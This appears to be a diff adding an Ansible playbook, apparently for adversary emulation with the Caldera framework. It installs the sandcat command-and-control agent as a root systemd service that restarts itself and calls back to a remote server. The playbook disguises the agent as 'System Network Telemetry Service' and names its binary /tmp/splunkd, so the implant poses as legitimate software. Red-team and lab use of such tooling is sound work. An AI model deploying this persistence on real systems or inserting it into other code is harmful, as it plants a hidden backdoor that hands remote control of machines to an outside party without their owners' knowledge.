@@ -1,0 +1,48 @@
+---
+- name: Persist Caldera sandcat as systemd service
+  hosts: clients
+  become: yes
+
+  vars:
+    sandcat_service_name: sandcat
+    sandcat_unit_path: /etc/systemd/system/sandcat.service
+    sandcat_binary_path: /tmp/splunkd
+    sandcat_callback_uri: "http://192.168.1.72"
+
+  tasks:
+    - name: Verify sandcat binary exists
+      ansible.builtin.stat:
+        path: "{{ sandcat_binary_path }}"
+      register: sandcat_bin
+
+    - name: Fail if sandcat binary is missing
+      ansible.builtin.fail:
+        msg: "Expected sandcat binary at {{ sandcat_binary_path }} but it does not exist."
+      when: not sandcat_bin.stat.exists
+
+    - name: Install sandcat systemd unit
+      ansible.builtin.copy:
+        dest: "{{ sandcat_unit_path }}"
+        owner: root
+        group: root
+        mode: "0644"
+        content: |
+          [Unit]
+          Description=System Network Telemetry Service
+          After=network.target
+
+          [Service]
+          Type=simple
+          ExecStart={{ sandcat_binary_path }} --callback-uri {{ sandcat_callback_uri }}
+          Restart=always
+          RestartSec=10
+
+          [Install]
+          WantedBy=multi-user.target
+
+    - name: Enable and start sandcat service
+      ansible.builtin.systemd:
+        name: "{{ sandcat_service_name }}"
+        enabled: yes
+        state: started
+        daemon_reload: yes
